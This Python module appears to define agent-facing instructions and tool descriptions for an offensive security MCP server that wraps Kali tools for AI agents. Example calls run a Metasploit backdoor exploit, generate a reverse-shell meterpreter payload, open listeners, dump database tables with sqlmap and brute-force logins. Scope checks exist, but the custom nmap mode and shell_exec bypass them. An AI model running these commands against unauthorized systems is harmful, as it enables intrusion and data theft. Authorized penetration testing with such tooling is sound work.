"""
Agent-facing MCP guidance and structured usage errors.

This module intentionally contains runtime metadata, not only contributor
documentation. FastMCP exposes these strings to clients so agents can choose
tools with less trial and error.
"""

from __future__ import annotations

from collections.abc import Iterable
from typing import Any


SERVER_INSTRUCTIONS = """
<server_purpose>
Hercules is an AI-orchestrated offensive security MCP server. It runs a Kali
tooling container, exposes scanners and exploitation helpers as structured MCP
tools, and preserves large or raw command output as workspace artifacts when
compact output is returned to the model. Use it for authorized reconnaissance,
web scanning, vulnerability verification, exploit workflow automation,
post-exploitation analysis, CTF/forensics tasks, shell automation, and custom
Nmap NSE or Nuclei authoring.
</server_purpose>

<workflow_map>
Recon starts with recon_dns, recon_whois, recon_amass, nmap_scan, and
network_curl. Web scanning maps to web_scan for fingerprinting, fuzz_dirs for
content discovery, web_vuln_scan for Dalfox or Commix checks, nuclei_run for
template-driven verification, and sqlmap_run for SQL injection workflows.
Exploitation maps to searchsploit, metasploit_search, metasploit_run_module,
metasploit_start_listener, metasploit_generate_payload, and metasploit_manage.
Post-exploitation maps to metasploit_manage for active sessions, shell_exec or
shell background jobs for container-side automation, and resources for linPEAS,
winPEAS, PowerUp, GTFOBins, and LOLBAS decision support. CTF and forensics
workflows map to ctf_binwalk, ctf_steghide, crack_john, bruteforce_hydra, and
shell_exec when a thin wrapper would be redundant.
</workflow_map>

<resources>
Read resource://agent_skills/nse before creating complex NSE scripts with
nmap_write_nse_script and nmap_run_nse_script. Read
resource://agent_skills/nuclei before creating complex Nuclei templates with
nuclei_write_template and nuclei_run. Use resource://post_exploitation/linpeas,
resource://post_exploitation/winpeas, and resource://post_exploitation/powerup
after a shell or Meterpreter session proves local execution and you need
privilege-escalation enumeration. Use resource://post_exploitation/gtfobins
after Linux enumeration finds sudo, SUID, or capabilities on common binaries.
Use resource://post_exploitation/lolbas after Windows enumeration finds
usable binaries, scripts, DLLs, writable service paths, or living-off-the-land
execution opportunities.
</resources>

<target_validation>
Many network-facing tools enforce ALLOWED_TARGETS and BLOCKED_TARGETS before a
command runs. If a tool returns error_type=target_not_allowed, narrow the target
to the configured scope or ask the operator to update the environment. Do not
interpret this as a scanner result because no target command was executed.
</target_validation>

<output_and_artifacts>
Tool output is sanitized for ANSI escape codes, OSC sequences, color codes,
null bytes, carriage-return progress overwrites, known banners, and explicit
tool progress noise. High-noise tools may return compact stdout plus fields
such as raw_artifact, stdout_artifact, stderr_artifact, artifact, truncated,
filter_notes, output_complete, stdout_truncated, stderr_truncated, parsed,
matches, results, or summary. Use include_raw=True on tools that support it
when exact raw evidence is needed; raw output remains bounded by truncation
and may still be saved to artifacts.
</output_and_artifacts>

<tool_selection>
Prefer purpose-built tools over shell_exec when the task maps to a registered
tool, because those tools apply target validation, timeouts, output shaping,
and concurrency classes. Use shell_exec as the escape hatch for missing tools,
one-off Linux commands, or workflows not represented by a public MCP tool. The
parameter leakage interceptor drops unknown injected parameters before a tool
call; valid public parameters such as include_raw, threads, extra_args, data,
cookie, and job_id are preserved when they appear in the tool signature.
</tool_selection>

<search_behavior>
For search-style workflows, use broader terms when exact names do not produce
useful matches. Hercules search tools should return closest useful matches or
suggestions where possible instead of hard "not found" dead ends.
</search_behavior>
""".strip()


def _desc(
    use_case: str,
    workflow_position: str,
    important_notes: str,
    examples: str,
) -> str:
    return (
        f"<use_case>{use_case}</use_case>\n"
        f"<workflow_position>{workflow_position}</workflow_position>\n"
        f"<important_notes>{important_notes}</important_notes>\n"
        f"<examples>{examples}</examples>"
    )


TOOL_DESCRIPTIONS = {
    "nmap_scan": _desc(
        "Run Nmap using mode=quick|aggressive|port|script|custom for host discovery, service enumeration, NSE execution, or fully custom Nmap arguments.",
        "Recon and vulnerability verification before deeper web, exploit, or post-exploitation work.",
        "quick/aggressive/port/script require target. port requires ports. script requires scripts. extra_args is preserved for quick, aggressive, port, and script modes. custom requires raw_args and does not target-validate unless the operator encoded target validation elsewhere. XML output is parsed before compaction; raw XML may be preserved as an artifact. quick/port/script use light concurrency; aggressive and broad custom scans can run longer.",
        "nmap_scan(mode='quick', target='scanme.nmap.org')\nnmap_scan(mode='script', target='host', scripts='vuln', extra_args='-sV')",
    ),
    "nmap_write_nse_script": _desc(
        "Write a custom NSE script into the container and update the Nmap script database.",
        "Custom NSE authoring after reading resource://agent_skills/nse.",
        "Pass name without path separators; Hercules sanitizes it and writes /usr/share/nmap/scripts/custom/<name>.nse. Use nmap_run_nse_script to execute it. Include NSEDoc metadata and correct categories in content.",
        "nmap_write_nse_script(name='http-custom-check', content='description = [[...]]\\nauthor = ...')",
    ),
    "nmap_run_nse_script": _desc(
        "Run a previously written custom NSE script against a validated target.",
        "Custom reconnaissance, protocol testing, vulnerability verification, and exploit workflow checks.",
        "Requires target and script_name. extra_args can pass -p, -sV, --script-args, --script-trace, -d, or -v. XML output is parsed when possible, preserving script output fields.",
        "nmap_run_nse_script(target='host', script_name='http-custom-check', extra_args='-p80 --script-trace')",
    ),
    "web_scan": _desc(
        "Run one web fingerprinting scanner selected by tool=httpx|whatweb|wafw00f|nikto|wpscan|arjun.",
        "Web reconnaissance and application fingerprinting before vulnerability-specific checks.",
        "httpx accepts urls or target and supports threads. whatweb uses agg_level. nikto supports tuning. wpscan supports enumerate and api_token. arjun supports method and threads. include_raw=True returns more raw-like output for high-noise scanners. Targeted variants enforce target validation.",
        "web_scan(tool='httpx', urls='http://a,http://b', threads=20)\nweb_scan(tool='nikto', target='http://host', tuning='x', include_raw=False)",
    ),
    "web_vuln_scan": _desc(
        "Run web vulnerability scanners selected by tool=dalfox|commix.",
        "Focused web vulnerability verification after recon or parameter discovery.",
        "Requires target_url. Dalfox maps threads to --worker and supports cookie and extra_args. Commix supports data, cookie, threads when native support exists, and extra_args. include_raw=True keeps fuller scanner output while still bounded by artifacts/truncation.",
        "web_vuln_scan(tool='dalfox', target_url='http://host/?q=1', threads=8)\nweb_vuln_scan(tool='commix', target_url='http://host/cmd', data='x=1', cookie='sid=1')",
    ),
    "fuzz_dirs": _desc(
        "Discover web paths with gobuster or ffuf while preserving thread control.",
        "Content discovery after a live HTTP service is confirmed.",
        "Requires target_url. tool defaults to gobuster; ffuf is selected with tool='ffuf'. threads controls native fuzzer concurrency. Missing wordlists return repair guidance and example paths. include_raw=True disables compact defaults.",
        "fuzz_dirs(target_url='http://host', wordlist='/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt', threads=30)\nfuzz_dirs(target_url='http://host', tool='ffuf', extensions='php,txt')",
    ),
    "ncat": _desc(
        "Use ncat with action=connect|listen|interact for TCP/UDP connections and background listeners.",
        "Networking, reverse shell handling, callback listeners, and ad hoc protocol interaction.",
        "connect requires target and port and runs foreground. listen can run foreground or background; background=True creates a job_id and pipe. interact requires job_id and can send command then read tail_lines. Use udp=True for UDP. Listeners are heavy concurrency.",
        "ncat(action='listen', port=4444, job_id='listener1')\nncat(action='interact', job_id='listener1', command='id', tail_lines=100)",
    ),
    "network_curl": _desc(
        "Make HTTP requests with curl using methods, headers, cookies, data, redirects, and extra curl arguments.",
        "Manual web probing, proof collection, API testing, and exploit verification.",
        "The URL is target-validated. Output is mostly raw aside from terminal cleanup and truncation. Use headers as comma-separated Header: value strings. Prefer nuclei_run or web_scan for repeatable template/scanner workflows.",
        "network_curl(url='http://host/path', method='POST', data='a=1', cookie='sid=1')",
    ),
    "network_hping3": _desc(
        "Craft packets with hping3 for firewall, service, or packet-level testing.",
        "Network validation and low-level packet checks after target scope is confirmed.",
        "Requires target. count, syn, port, and extra_args map to hping3. Runs with light concurrency and target validation.",
        "network_hping3(target='host', count=3, syn=True, port=80)",
    ),
    "recon_dns": _desc(
        "Run DNS lookups with tool=dig|dnsx for single-record queries or bulk resolution.",
        "DNS reconnaissance before port scanning and web probing.",
        "dig uses target, record_type, server, short, axfr, and extra_args. dnsx uses domains or target and silent/extra_args. Use recon_amass for subdomain enumeration and recon_whois for registrar data.",
        "recon_dns(tool='dig', target='example.com', record_type='MX', short=True)\nrecon_dns(tool='dnsx', domains='a.example.com,b.example.com', extra_args='-a')",
    ),
    "recon_whois": _desc(
        "Collect WHOIS registration data for a domain.",
        "Passive recon and ownership/context gathering.",
        "Use include_raw=True if registry boilerplate or exact legal text is needed. Default output preserves registrar, dates, nameservers, statuses, DNSSEC, and contact fields while compacting terms-of-use noise.",
        "recon_whois(domain='example.com')",
    ),
    "recon_amass": _desc(
        "Enumerate subdomains with amass using passive, active, and brute-force modes.",
        "Subdomain reconnaissance after scope and target validation are established.",
        "Requires domain and validates it. active=False uses passive mode. brute=True enables brute force. This is heavy and can take up to 20 minutes.",
        "recon_amass(domain='example.com', active=False)\nrecon_amass(domain='example.com', active=True, brute=True)",
    ),
    "metasploit_search": _desc(
        "Search Metasploit exploit, auxiliary, and post modules by keyword, service name, or CVE.",
        "Exploit planning before metasploit_run_module or metasploit_start_listener.",
        "Returns available modules that may help with the query. Broaden the query if the list is empty. Metasploit must be enabled and RPC available.",
        "metasploit_search(query='vsftpd')\nmetasploit_search(query='CVE-2011-2523')",
    ),
    "metasploit_run_module": _desc(
        "Run a Metasploit exploit, auxiliary, or post module through the RPC API.",
        "Exploitation and post-exploitation automation after module selection.",
        "module_type is usually exploit, auxiliary, or post. options should contain module datastore options such as RHOSTS/RPORT/TARGETURI. payload and payload_options are used for exploits. Payload listener keys accidentally placed in options are auto-routed when possible.",
        "metasploit_run_module(module_type='exploit', module_name='unix/ftp/vsftpd_234_backdoor', options={'RHOSTS':'10.0.0.5'})",
    ),
    "metasploit_manage": _desc(
        "Manage Metasploit sessions and jobs with action=list_sessions|interact_session|close_session|list_jobs|stop_job.",
        "Session management after exploitation and listener/job cleanup.",
        "interact_session requires session_id and command. close_session requires session_id. stop_job requires job_id. Outputs include active sessions/jobs where available so agents can correct stale IDs.",
        "metasploit_manage(action='list_sessions')\nmetasploit_manage(action='interact_session', session_id=1, command='id')",
    ),
    "metasploit_generate_payload": _desc(
        "Generate a payload through Metasploit RPC or msfvenom fallback.",
        "Payload preparation for exploit chains, listeners, and manual delivery.",
        "Pass payload and options such as LHOST/LPORT. format controls output format. Successful RPC generation writes payload bytes into /opt/workspace/payloads/.",
        "metasploit_generate_payload(payload='linux/x86/meterpreter/reverse_tcp', options={'LHOST':'10.0.0.1','LPORT':4444}, format='elf')",
    ),
    "metasploit_start_listener": _desc(
        "Start exploit/multi/handler as a Metasploit background job.",
        "Reverse shell or Meterpreter callback handling before exploit delivery.",
        "Requires payload_type, lhost, and lport. lport must be 1-65535. Use system_network_info first to choose LHOST/LPORT on bridge-networked hosts. Manage jobs with metasploit_manage.",
        "metasploit_start_listener(payload_type='linux/x86/meterpreter/reverse_tcp', lhost='10.0.0.1', lport=4444)",
    ),
    "sqlmap_run": _desc(
        "Run sqlmap with action=scan_basic|scan_custom|enumerate|dump|os_cmd.",
        "SQL injection detection, enumeration, dumping, or OS command checks.",
        "Requires target_url and target validation. Always uses --batch and a workspace output directory. scan_custom supports method, data, cookies, level, risk, techniques, tamper, proxy, forms, and extra_args. include_raw=True preserves fuller logs.",
        "sqlmap_run(action='scan_basic', target_url='http://host/item?id=1')\nsqlmap_run(action='dump', target_url='http://host/item?id=1', db='app', table='users')",
    ),
    "searchsploit": _desc(
        "Search or mirror Exploit-DB entries with action=search|get.",
        "Exploit research before manual validation or Metasploit module selection.",
        "Search returns JSON when available and may degrade overly specific queries to broader terms. include_raw=True avoids result capping. get mirrors an exploit by ID and returns content when available.",
        "searchsploit(action='search', query_or_id='apache 2.4')\nsearchsploit(action='get', query_or_id='49757')",
    ),
    "bruteforce_hydra": _desc(
        "Run Hydra for online credential testing against a service.",
        "Credential attack workflows where authorized credentials testing is in scope.",
        "Requires target, service, usernames, and passwords. Prefix usernames/passwords with file: for wordlists. Target is validated. Output summary keeps credential findings.",
        "bruteforce_hydra(target='host', service='ftp', usernames='msfadmin', passwords='msfadmin')",
    ),
    "crack_john": _desc(
        "Run John the Ripper against supplied hashes using a wordlist.",
        "Offline hash cracking and CTF/password recovery workflows.",
        "Hashes are written to a temporary workspace file, cracked with john, shown with john --show, then the temp file is removed. Use format and extra_args when hash type needs explicit selection.",
        "crack_john(hashes='$y$j9T$...', format='crypt', wordlist='/usr/share/wordlists/rockyou.txt')",
    ),
    "nuclei_run": _desc(
        "Run Nuclei templates against one or more targets with JSONL output.",
        "Template-driven vulnerability verification and custom template execution.",
        "targets is comma-separated. templates can point to a workspace template from nuclei_write_template or installed template paths. severity, tags, rate_limit, and extra_args tune execution. include_raw=True keeps request/response-heavy JSON fields; default compact mode returns matches.",
        "nuclei_run(targets='http://host', templates='/opt/workspace/nuclei-templates/check.yaml', rate_limit=5)",
    ),
    "nuclei_write_template": _desc(
        "Write a custom Nuclei YAML template into /opt/workspace/nuclei-templates.",
        "Custom vulnerability checks after reading resource://agent_skills/nuclei.",
        "Path traversal is rejected. Use relative paths such as custom/check.yaml. Validate with nuclei -validate via shell_exec or run with nuclei_run using the returned path.",
        "nuclei_write_template(path='custom/basic-detect.yaml', content='id: basic-detect\\ninfo: ...')",
    ),
    "shell_exec": _desc(
        "Execute a non-interactive shell command inside the Kali container.",
        "Escape hatch for Linux commands, missing tools, package checks, custom validation, and artifact inspection.",
        "This is not interactive; use shell_exec_background or ncat/listeners for long-running interactive jobs. raw=True disables output cleaning but output is still bounded and artifacted when large. Commands are written to a temporary script so complex quoting and newlines work. For python -c snippets with Windows paths, PowerShell/C#/base64 chains, or heavy quoting, write a helper script with workspace_write_file and run the file.",
        "shell_exec(command='id && pwd')\nshell_exec(command='apt-get update && apt-get install -y jq', timeout=600)",
    ),
    "shell_exec_background": _desc(
        "Start a long-running shell command as a background job.",
        "Listeners, servers, long scans, and commands that need periodic output checks.",
        "Requires job_id. Use shell_check_job to read output and shell_kill_job to stop the process. Background jobs share the current container session.",
        "shell_exec_background(command='python3 -m http.server 8000', job_id='http8000')",
    ),
    "shell_check_job": _desc(
        "Read status and tail output from a background shell job.",
        "Monitoring background listeners, long scans, and helper services.",
        "Requires job_id. tail_lines controls how much recent output is returned. If output is too short, increase tail_lines or inspect artifacts with workspace_read_file/shell_exec.",
        "shell_check_job(job_id='http8000', tail_lines=100)",
    ),
    "shell_kill_job": _desc(
        "Stop a background shell job by job_id.",
        "Cleanup for listeners, servers, and stuck commands.",
        "Requires job_id. Use shell_check_job first if you need final output. The response says whether a process was killed.",
        "shell_kill_job(job_id='http8000')",
    ),
    "workspace_read_file": _desc(
        "Read a file inside the container workspace or an absolute container path.",
        "Artifact review, custom script inspection, and result collection.",
        "Relative paths resolve under /opt/workspace. Use this for saved templates, scripts, logs, and tool artifacts when stdout was compacted. encoding='base64' reads binaries without replacement decoding and returns byte size.",
        "workspace_read_file(path='nuclei-templates/custom/check.yaml')\nworkspace_read_file(path='payload.exe', encoding='base64')",
    ),
    "workspace_write_file": _desc(
        "Write content to a file in the container workspace or an absolute container path.",
        "Preparing payloads, helper scripts, target lists, and custom config files.",
        "Relative paths resolve under /opt/workspace. mode defaults to 0644 and accepts integers or strings like '0644' and '0o755'. Use content_base64 for binary-safe writes or to avoid complex quoting in PowerShell, C#, base64, or Windows-path workflows. For NSE and Nuclei authoring prefer the dedicated write tools when applicable.",
        "workspace_write_file(path='targets.txt', content='http://host\\n')\nworkspace_write_file(path='payload.bin', content_base64='AAE=', mode='0644')",
    ),
    "system_start_new_session": _desc(
        "Start a fresh Hercules container session with a clean mounted workspace.",
        "Session lifecycle management when switching targets or engagements.",
        "Creates a new workspace and stops the current container. Previous host workspace data is preserved. Metasploit RPC is reinitialized when enabled.",
        "system_start_new_session()",
    ),
    "system_list_sessions": _desc(
        "List Hercules session workspaces on the host.",
        "Workspace audit, cleanup planning, and confirming active session state.",
        "Returns active_session, total_sessions, and per-session metadata where available. Does not modify the container.",
        "system_list_sessions()",
    ),
    "system_stop_container": _desc(
        "Stop and remove the current Hercules container while preserving workspace files.",
        "End-of-engagement cleanup when no further tools need to run.",
        "After this tool succeeds, MCP tools that require the container cannot run until a new session is started. It stops background jobs and container-side processes.",
        "system_stop_container()",
    ),
    "system_network_info": _desc(
        "Inspect host/container networking and recommend an LHOST for callbacks.",
        "Exploit and listener setup before Metasploit or ncat reverse shell workflows.",
        "On Windows/macOS bridge networking, use the host VPN/tunnel IP and forwarded ports 4444-4464. On Linux host networking, use the host/VPN interface directly.",
        "system_network_info()",
    ),
    "ctf_binwalk": _desc(
        "Analyze and optionally extract firmware, archives, and embedded files with binwalk.",
        "CTF, forensics, firmware review, and artifact unpacking.",
        "extract=True adds extraction flags and --run-as=root unless extra_args already specifies --run-as. Absolute paths extract from their containing directory to avoid duplicate paths.",
        "ctf_binwalk(filepath='/opt/workspace/sample.bin', extract=True)",
    ),
    "ctf_steghide": _desc(
        "Inspect or extract steghide payloads with action=info|extract.",
        "Steganography and CTF artifact workflows.",
        "Pass filepath and optional passphrase. Without a passphrase Hercules passes an empty one to avoid an interactive prompt. extra_args can tune steghide behavior.",
        "ctf_steghide(action='info', filepath='/opt/workspace/image.jpg')\nctf_steghide(action='extract', filepath='/opt/workspace/image.jpg', passphrase='secret')",
    ),
}


def _as_list(value: Any) -> list[Any]:
    if value is None:
        return []
    if isinstance(value, str):
        return [value]
    if isinstance(value, Iterable) and not isinstance(value, (bytes, bytearray, dict)):
        return list(value)
    return [value]


def usage_error(
    tool: str,
    error_type: str,
    message: str,
    *,
    received: Any = None,
    expected: Any = None,
    examples: Any = None,
    next_steps: Any = None,
    **extra: Any,
) -> dict:
    """Return a consistent, agent-repairable tool usage error."""
    result = {
        "tool": tool,
        "status": "error",
        "error_type": error_type,
        "message": message,
    }
    if received is not None:
        result["received"] = received
    if expected is not None:
        result["expected"] = expected
    example_list = _as_list(examples)
    if example_list:
        result["examples"] = example_list
    next_step_list = _as_list(next_steps)
    if next_step_list:
        result["next_steps"] = next_step_list
    for key, value in extra.items():
        if value is not None:
            result[key] = value
    return result


def selector_error(
    tool: str,
    selector_name: str,
    received: Any,
    expected: Iterable[str],
    *,
    examples: Any = None,
    next_steps: Any = None,
) -> dict:
    expected_values = list(expected)
    return usage_error(
        tool,
        "invalid_selector",
        f"Invalid {selector_name!r} selector for {tool}.",
        received={selector_name: received},
        expected={selector_name: expected_values},
        examples=examples,
        next_steps=next_steps or f"Choose one of: {', '.join(expected_values)}.",
    )


def missing_param_error(
    tool: str,
    parameter: str,
    *,
    when: str = "",
    examples: Any = None,
    next_steps: Any = None,
) -> dict:
    message = f"Missing required parameter {parameter!r}."
    if when:
        message += f" Required when {when}."
    return usage_error(
        tool,
        "missing_required_parameter",
        message,
        expected={parameter: "non-empty value"},
        examples=examples,
        next_steps=next_steps or f"Provide {parameter} and retry the tool call.",
    )


def target_error(tool: str, target: str, exc: Exception, config: Any = None) -> dict:
    message = str(exc)
    lowered = message.lower()
    error_type = "target_not_allowed" if "blocked" in lowered or "allowed targets" in lowered else "invalid_target"
    return usage_error(
        tool,
        error_type,
        message,
        received={"target": target},
        expected={
            "allowed_targets": getattr(config, "allowed_targets", None),
            "blocked_targets": getattr(config, "blocked_targets", None),
        },
        next_steps=[
            "Use a target inside the configured authorization scope.",
            "If the scope is wrong, ask the operator to update ALLOWED_TARGETS or BLOCKED_TARGETS.",
        ],
    )


def path_error(tool: str, path: str, message: str, *, examples: Any = None) -> dict:
    return usage_error(
        tool,
        "invalid_path",
        message,
        received={"path": path},
        expected="A relative workspace-safe path without '..' path traversal.",
        examples=examples,
        next_steps="Use a relative path such as custom/check.yaml.",
    )


def backend_unavailable(tool: str, message: str, *, next_steps: Any = None) -> dict:
    return usage_error(
        tool,
        "backend_unavailable",
        message,
        next_steps=next_steps or "Start the required backend service or run Hercules with that backend enabled.",
    )
